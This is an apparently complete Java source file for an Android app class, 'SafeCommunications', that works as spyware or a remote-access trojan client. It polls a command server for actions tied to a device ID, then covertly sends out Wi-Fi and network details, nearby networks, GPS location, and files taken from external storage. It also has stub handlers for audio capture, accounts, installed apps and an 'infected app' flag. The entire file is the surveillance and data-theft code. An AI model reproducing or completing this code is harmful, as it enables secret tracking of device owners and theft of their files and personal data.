package com.safe.myapp;

import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.support.v4.util.Pair;
import android.text.format.Formatter;
import android.util.JsonReader;
import android.util.Log;
import android.widget.Toast;

import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import cz.msebera.android.httpclient.Header;

public class SafeCommunications {

    private Context context;
    private SafeStatus status;
    private SafeLogger logger;
    private String simpleID;

    public SafeCommunications(Context context, SafeStatus status, SafeLogger logger, String simpleID) {
        this.context = context;
        this.status = status;
        this.logger = logger;
        this.simpleID = simpleID;
    }

    private void sayWifi() {
        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        List<Pair> sayWifi = new ArrayList<>();
        // TODO make data serializable through json.
        if (mWifi.isConnected()) {
            sayWifi.add(new Pair("type", "wifi"));
            sayWifi.add(new Pair("status", "Connected"));
            sayWifi.add(new Pair("ssid", wifiInfo.getSSID()));
            sayWifi.add(new Pair("bssid", wifiInfo.getBSSID()));
            sayWifi.add(new Pair("mac", wifiInfo.getMacAddress()));
            sayWifi.add(new Pair("ip", Formatter.formatIpAddress(wifiInfo.getIpAddress())));
            // TODO because then we can just add an array to the request params
            List<ScanResult> results = wifiMgr.getScanResults();
            StringBuilder sb = new StringBuilder();
            for (ScanResult result : results) {
                sb.append(result.SSID + " " + result.BSSID + " " + result.level);
            }
            if(results.size() > 0) {
                sayWifi.add(new Pair("nearby", sb.toString())); // TODO THIS IS MADNESS!
            }
        } else {
            sayWifi.add(new Pair("status", "Not connected"));
        }
        say(sayWifi);
    }

    // TODO Walk directory
    public void download(String... fileLocs) {
        // list of files to be uploaded to server
        ArrayList<File> files = new ArrayList<>();
        try {
            for (String fileLoc : fileLocs) {
                // create a file object from each string
                File file = new File(Environment.getExternalStorageDirectory(), fileLoc);
                // check if the file exists
                if (file.exists()) {
                    // if it exists and is a file add the file to our list
                    if (file.isFile()) {
                        files.add(file);
                        // if it is a directory add all files in it to our list
                    } else if (file.isDirectory()) {
                        logger.write(file + " is a directory, sending all files within it, skipping folders");
                        for (File f : file.listFiles()) {
                            if (f.isFile()) {
                                files.add(f);
                                logger.write("sending " + f + " " + f.length());
                            }
                        }
                    } else {
                        logger.write(fileLoc + " is not a valid file");
                    }
                } else {
                    logger.write(fileLoc + " does not exist");
                }
            }
            // upload files to server
            upload(files.toArray(new File[files.size()]));
        } catch (NullPointerException e) {
            logger.write("w00ps");
        }
    }

    // Poll server for actions to take
    public void pollServer() {
        RequestParams params = new RequestParams();
        SafeRestClient.get("/actions/" + simpleID + "/", params, new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                actionHandler(responseBody);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

            }
        });
    }

    public void actionHandler(byte[] response) {
        try {
            JSONObject jObject = new JSONObject(new String(response, "UTF-8"));
            logger.write(jObject.toString(2));
            boolean startLocation = jObject.getBoolean("startLocation");
            boolean startAudio = jObject.getBoolean("startAudio");
            boolean startFTP = jObject.getBoolean("startFTP");
            boolean sayWifi = jObject.getBoolean("sayWifi");
            boolean sayAccounts = jObject.getBoolean("sayAccounts");
            boolean saySingleLocation = jObject.getBoolean("saySingleLocation");
            boolean sayInstalledApps = jObject.getBoolean("sayInstalledApps");
            boolean sayModelBrand = jObject.getBoolean("sayModelBrand");
            boolean sayInfectedApp = jObject.getBoolean("sayInfectedApp");
            String sayDirectoryContent = jObject.getString("sayDirectoryContent"); // TODO make array
            String toast = jObject.getString("toast");
            String dialog = jObject.getString("dialog");


            if (startLocation) {

            } else {

            }

            if (startAudio) {

            } else {

            }


            if (startFTP) {

            } else {

            }

            if (sayWifi) {
                sayWifi();
            }

            if (sayAccounts) {

            }

            if (saySingleLocation) {

            }

            if (sayInstalledApps) {

            }

            if (sayModelBrand) {

            }

            if (sayInfectedApp) {

            }

            if (!sayDirectoryContent.isEmpty()) {

            }

            if (!toast.isEmpty()) {
                showToast(toast);
            }

            if (!dialog.isEmpty()) {
                showDialog(dialog);
            }

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void showToast(String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String[] params) {
                String str = params[0];
                return str;
            }

            @Override
            protected void onPostExecute(String message) {
                Toast.makeText(context, message, Toast.LENGTH_LONG).show();
            }
        }.execute(message);
    }

    private void showDialog(String message) {
        Intent i = new Intent(context, SafeDialog.class);
        i.putExtra("message", message);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

    public void say(List<Pair> kvps) {
        RequestParams params = new RequestParams();
        for(Pair p : kvps){
            params.put(p.first.toString(), p.second);
        }
        logger.write(params.toString());
        SafeRestClient.post("/say/" + simpleID + "/", params, new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {

            }

            @Override
            public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {

            }
        });
    }

    public void sayLocation(Location location) {
        RequestParams loc = new RequestParams();
        loc.put("lat", location.getLatitude());
        loc.put("lng", location.getLongitude());
        loc.put("accuracy", location.getAccuracy());
        loc.put("timestamp", location.getTime());
        loc.put("provider", location.getProvider());
        SafeRestClient.get("/updateLocation/" + simpleID + "/", loc, new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {

            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

            }
        });
    }

    public void upload(File... files) {
        for (final File file : files) {
            logger.write(file.getName() + " Checking");
            RequestParams fileCheck = new RequestParams();
            fileCheck.put("fileName", file.getName());
            fileCheck.put("clientId", simpleID);
            fileCheck.put("fileSize", file.length());
            SafeRestClient.get("/acceptFile/" + simpleID + "/", fileCheck, new AsyncHttpResponseHandler() {

                @Override
                public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {

                    RequestParams params = new RequestParams();
                    logger.write(file.getName() + " Does not exist. Uploading...");
                    try {
                        params.put("tehAwesomeFile", file);
                        params.put("clientId", simpleID);
                    } catch (FileNotFoundException e) {
                        logger.write("Could not find file: " + file.getName());
                    }

                    SafeRestClient.post("/postFile/" + simpleID + "/", params, new AsyncHttpResponseHandler() {

                        @Override
                        public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {
                            try {
                                logger.write(new String(responseBody, "UTF-8") + " Received");
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                        }

                        @Override
                        public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                            try {
                                if (responseBody != null) {
                                    logger.write(new String(responseBody, "UTF-8"));
                                }
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                        }
                    });
                }

                @Override
                public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                    // The server did not accept the file
                    try {
                        logger.write(new String(responseBody, "UTF-8"));
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                }
            });
        }
        logger.write("Upload completed");
    }
}